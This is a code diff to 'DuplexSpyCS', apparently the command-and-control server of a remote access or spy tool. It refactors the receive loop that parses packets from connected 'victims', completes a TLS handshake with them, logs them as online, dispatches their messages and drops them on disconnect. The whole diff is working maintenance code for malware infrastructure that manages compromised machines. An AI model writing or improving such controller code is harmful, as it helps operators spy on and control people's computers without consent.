@@ -159,35 +159,46 @@ namespace DuplexSpyCS
                         abDynamicRecvBuffer, 0, abDynamicRecvBuffer.Length,
                         abStaticRecvBuffer, 0, nRecv);
 
-                    while (abDynamicRecvBuffer.Length >= clsDSP.HEADER_SIZE)
+                    while (true)
                     {
+                        if (abDynamicRecvBuffer.Length < clsDSP.HEADER_SIZE)
+                            break;
+
                         var header = clsDSP.GetHeader(abDynamicRecvBuffer);
-                        if (abDynamicRecvBuffer.Length - clsDSP.HEADER_SIZE < header.len)
+
+                        if (abDynamicRecvBuffer.Length < clsDSP.HEADER_SIZE + header.len)
                             break;
 
                         dsp = new clsDSP(abDynamicRecvBuffer);
-                        abDynamicRecvBuffer = dsp.MoreData;
 
-                        int cmd = header.cmd;
-                        int para = header.para;
+                        int cmd = dsp.Command;
+                        int para = dsp.Param;
                         byte[] msg = dsp.GetMsg().msg;
+
+                        abDynamicRecvBuffer = dsp.MoreData;
 
                         if (cmd == CMD_TLS && para == PARA_HELLO)
                         {
                             victim.fnSslSend(CMD_TLS, PARA_ACK, clsEZData.fnGenerateRandomStr());
-
                             m_lsVictim.Add(victim);
-
-                            clsStore.sql_conn.WriteSystemLogs($"Client online: {victim.socket.RemoteEndPoint}");
+                            clsStore.sql_conn.WriteSystemLogs(
+                                $"Client online: {victim.socket.RemoteEndPoint}");
                         }
                         else if (cmd == 2 && para == 0)
                         {
-                            string szPlain = Encoding.UTF8.GetString(msg);
-                            Task.Run(() => fnReceivedDecoded(this, victim, szPlain.Split('|').ToList()));
+                            try
+                            {
+                                string szPlain = Encoding.UTF8.GetString(msg);
+                                List<string> lsMsg = szPlain.Split('|').ToList();
+                                fnReceivedDecoded(this, victim, lsMsg);
+                            }
+                            catch (InvalidOperationException)
+                            {
+                            }
                         }
                     }
                 }
-                while (true);
+                while (nRecv > 0 && m_bIslistening);
             }
             catch (Exception ex)
             {
@@ -195,8 +206,8 @@ namespace DuplexSpyCS
             }
             finally
             {
-                m_lsVictim.Remove(victim);
                 fnDisconnected(victim);
+                m_lsVictim.Remove(victim);
             }
         }
     }
